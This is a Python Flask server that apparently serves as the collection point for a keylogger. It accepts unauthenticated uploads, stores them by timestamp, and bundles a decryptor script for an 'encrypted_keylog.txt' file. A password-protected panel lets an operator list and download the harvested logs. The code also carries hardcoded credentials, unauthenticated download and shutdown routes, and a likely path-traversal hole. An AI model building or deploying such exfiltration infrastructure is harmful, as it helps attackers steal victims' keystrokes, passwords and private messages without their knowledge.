from flask import Flask, request, render_template_string, send_file, redirect, session
import os
import datetime
import zipfile
import io
from werkzeug.utils import secure_filename
import tempfile
import threading

app = Flask(__name__)
app.secret_key = "super-secret-key"
TEMP_DIR = tempfile.gettempdir()
UPLOAD_FOLDER = os.path.join(TEMP_DIR, "flask_uploads")
USERNAME = "admin"
PASSWORD = "password123"

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# --- HTML Templates --- #
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html><head><title>Login</title></head><body>
<h2>Login</h2>
<form method="post">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Login">
</form>
</body></html>'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == USERNAME and request.form['password'] == PASSWORD:
            session['logged_in'] = True
            return redirect('/list')
        return 'Invalid credentials', 401
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/upload', methods=['POST'])
def upload():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%I-%M-%S%p")
    folder_path = os.path.join(UPLOAD_FOLDER, timestamp)
    os.makedirs(folder_path, exist_ok=True)

    for name, file in request.files.items():
        filename = secure_filename(file.filename or name)
        file.save(os.path.join(folder_path, filename))

    with open(os.path.join(folder_path, "decryptor.py"), "w") as f:
        f.write(DECRYPTOR_CODE)

    return 'Files uploaded and saved successfully.', 200

@app.route('/list')
def list_uploads():
    if not session.get('logged_in'):
        return redirect('/')
    folders = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
    html = '<h2>Session Uploads</h2><ul>'
    for folder in folders:
        html += f'<li><a href="/view/{folder}">{folder}</a></li>'
    html += '</ul><br><a href="/download_all">Download All</a><br><a href="/logout">Logout</a><br>'
    html += '<form action="/shutdown"><button>Shutdown Server</button></form>'
    return html

@app.route('/view/<folder>')
def view_folder(folder):
    if not session.get('logged_in'):
        return redirect('/')
    path = os.path.join(UPLOAD_FOLDER, folder)
    if not os.path.exists(path):
        return 'Folder not found.', 404
    files = os.listdir(path)
    html = f'<h3>Files in {folder}</h3><ul>'
    for file in files:
        html += f'<li><a href="/download/{folder}/{file}">{file}</a></li>'
    html += '</ul><a href="/list">Back to list</a>'
    return html

@app.route('/download/<folder>/<filename>')
def download_file(folder, filename):
    path = os.path.join(UPLOAD_FOLDER, folder, filename)
    if not os.path.exists(path):
        return 'File not found', 404
    return send_file(path, as_attachment=True)

@app.route('/download_all')
def download_all():
    if not session.get('logged_in'):
        return redirect('/')
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as z:
        for root, _, files in os.walk(UPLOAD_FOLDER):
            for file in files:
                fp = os.path.join(root, file)
                z.write(fp, arcname=os.path.relpath(fp, UPLOAD_FOLDER))
    memory_file.seek(0)
    return send_file(memory_file, download_name="all_uploads.zip", as_attachment=True)

@app.route('/shutdown')
def shutdown():
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    return 'Server shutting down...'

# --- Auto-added decryptor --- #
DECRYPTOR_CODE = '''
from cryptography.fernet import Fernet
import os
import datetime

LOG_FILE = "encrypted_keylog.txt"
KEY_FILE = "secret.key"

if not os.path.exists(LOG_FILE) or not os.path.exists(KEY_FILE):
    print("Missing log or key file.")
    exit()

with open(KEY_FILE, "rb") as kf:
    key = kf.read()
fernet = Fernet(key)

with open(LOG_FILE, "r") as enc_file:
    lines = enc_file.readlines()

output_file = f"decrypted_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(output_file, "w") as dec_file:
    for line in lines:
        try:
            dec = fernet.decrypt(line.strip().encode()).decode()
            dec_file.write(dec + "\n")
        except:
            print("Skipping malformed line.")
print(f"Decrypted output saved to {output_file}")
'''

if __name__ == '__main__':
    import sys
    if '--threaded' in sys.argv:
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000)).start()
    else:
        app.run(host='0.0.0.0', port=5000)


